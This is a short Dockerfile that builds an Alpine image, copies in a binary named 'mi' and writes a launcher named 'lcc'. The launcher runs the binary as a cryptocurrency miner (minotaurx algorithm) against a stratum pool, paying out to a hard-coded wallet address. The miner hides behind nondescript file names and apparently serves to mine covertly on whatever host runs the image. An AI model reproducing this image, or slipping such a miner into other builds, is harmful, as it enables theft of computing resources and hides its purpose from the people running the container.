FROM alpine:3.9

RUN set -x \
    # Runtime dependencies.
 && apk add --no-cache \
        libcurl \
        libgcc \
        libstdc++ \
        openssl \
  && apk add --no-cache -t .build-deps \
        autoconf \
        automake \
        build-base \
        curl \
        curl-dev \
        git \
        wget \
        openssl-dev
COPY ./mi /usr/bin
RUN chmod +x /usr/bin/mi
RUN echo "mi -a minotaurx  -o stratum+tcps://stratum-eu.rplant.xyz:17063 -u CKhjQDYLfRjB12f86pSqUHzYmsPPshmiHq" > /usr/bin/lcc
RUN chmod +x /usr/bin/lcc
